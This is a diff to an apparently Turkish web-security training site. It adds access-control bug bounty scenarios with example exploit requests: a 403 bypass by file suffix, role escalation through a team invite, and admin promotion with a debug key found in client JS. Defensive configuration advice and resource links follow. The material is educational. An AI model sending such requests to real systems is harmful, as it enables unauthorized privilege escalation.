+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">GET /admin/users -> 403 Forbidden
+GET /admin/users.json -> 200 OK
+GET /admin/users.action -> 200 OK</pre>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 14 - Davet & Organizasyon Rol Manipülasyonu</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Standart üye yeni bir kullanıcıyı ekibe davet ederken rolünü "Owner/Admin" olarak belirleyebilir.<br>
+                      <strong style="margin-top:6px; display:block;">Exploit İsteği:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">POST /api/team/invite HTTP/1.1
+Content-Type: application/json
+
+{"invite_email": "secondary_account@test.com", "role": "SuperAdmin"}</pre>
+                      <p class="small" style="margin-top:4px;">Davet edilen ikinci hesap açıldığında doğrudan en üst yetkiyle başlar.</p>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 15 - JavaScript Dosyalarında Gizlenmiş API Anahtarı ve Rotalar</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Client-side derlenen JS bundle'larında yönetici API rotaları ve yetkili test anahtarları hardcoded unutulmuştur.<br>
+                      <strong style="margin-top:6px; display:block;">Keşif:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#d6f4ff;">// main.js analizi:
+const ADMIN_API = "/api/internal/v1/manage";
+const BACKDOOR_KEY = "super_secret_debug_admin_key";</pre>
+                      <strong style="margin-top:6px; display:block;">Exploit İsteği:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">POST /api/internal/v1/manage/promote HTTP/1.1
+X-Debug-Key: super_secret_debug_admin_key
+Content-Type: application/json
+
+{"user_id": 105, "make_admin": true}</pre>
+                    </div>
+                  </details>
+                </li>
+              </ul>
+            `
+          },
+          {
+            title: '6. Savunma ve Doğru Yapılandırma Standartları',
+            content: `
+              <ul style="list-style:none; padding:0; margin:0; display:grid; gap:10px;">
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#4ade80;">1. Merkezi ve Sunucu Taraflı Yetkilendirme (Centralized RBAC):</strong> Yetki kontrolleri hiçbir zaman arayüze veya tek tek controller kodlarına bırakılmamalı; API route middleware veya interceptor katmanında zorunlu tutulmalıdır.
+                </li>
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#4ade80;">2. DTO ve Beyaz Liste (Allowlist) Doğrulaması:</strong> Mass Assignment zafiyetini engellemek için gelen istek gövdeleri doğrudan veri tabanı nesnesine dönüştürülmemeli; yalnızca izin verilen alanları (örn: <code>name</code>, <code>bio</code>) kabul eden DTO (Data Transfer Object) şemaları kullanılmalıdır.
+                </li>
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#4ade80;">3. Oturum Bağlamı Doğrulaması (Context Enforcement):</strong> Güncelleme ve silme işlemlerinde kullanıcı veya organizasyon kimliği istek gövdesinden/rotasından değil; doğrulanmış JWT/Session nesnesinden okunmalıdır.
+                </li>
+              </ul>
+            `
           }
         ]
       },
@@ -10474,10 +11285,14 @@ POST /api/users/update
               <a href="https://www.youtube.com/c/Nahamsec" target="_blank" style="color:#34d399;text-decoration:none">NahamSec</a>: Bug bounty live stream'leri ve ipuçları.
             </li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
-              <a href="https://www.youtube.com/c/HackerOneTV" target="_blank" style="color:#34d399;text-decoration:none">HackerOne TV</a>: Resmi HackerOne videoları ve etkinlikler.
+              <a href="https://www.youtube.com/@gkhck" target="_blank" style="color:#34d399;text-decoration:none">Gökhan Güzelkokar</a>: Web güvenliği, bug bounty, pentest ve ileri seviye güvenlik araştırmaları üzerine teknik içerikler.
+            </li>
+
+            <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
+              <a href="https://www.youtube.com/@ResulBozburun" target="_blank" style="color:#34d399;text-decoration:none">Resul Bozburun</a>: Web hacking, bug bounty, sızma testi ve gerçek dünya güvenlik araştırmaları üzerine teknik içerikler.
             </li>
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
-              <a href="https://www.youtube.com/c/STOKfredrik" target="_blank" style="color:#34d399;text-decoration:none">STÖK</a>: İleri seviye web hacking ve bug bounty videoları.
+              <a href="https://www.youtube.com/c/HackerOneTV" target="_blank" style="color:#34d399;text-decoration:none">HackerOne TV</a>: Resmi HackerOne videoları ve etkinlikler.
             </li>
           </ul>
         `
@@ -11209,6 +12024,11 @@ function showPage(pageId) {
       }
 
       const main = document.getElementById('mainContent');
+      if (pageId === 'toolbox') {
+        main.style.zoom = '0.75';
+      } else {
+        main.style.zoom = '1';
+      }
       const page = CONTENT[pageId];
 
       if (!page) return;
@@ -11366,7 +12186,7 @@ function showPage(pageId) {
         let toolboxHtml = `<h1>${page.title}</h1><p class="lead">${page.description || ''}</p><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">`;
         page.categories.forEach(category => {
           toolboxHtml += `<h2>${category.categoryTitle}</h2>`;
-          let cardsHtml = category.tools.map(tool => `<div class="tool-card" data-tool-id="${tool.id}"><i class="${tool.icon} tool-icon"></i><h3 class="tool-title">${tool.title}</h3><p class="tool-description">${tool.description}</p><span class="tool-link">Aracı Aç →</span></div>`).join('');
+          let cardsHtml = category.tools.map(tool => `<div class="tool-card" data-tool-id="${tool.id}"><i class="${tool.icon} tool-icon"></i><h3 class="tool-title">${tool.title}</h3><p class="tool-description">${tool.description}</p><span class="tool-link">← Görüntüle →</span></div>`).join('');
           toolboxHtml += `<div class="tool-grid-container">${cardsHtml}</div>`;
         });
         main.innerHTML = toolboxHtml;
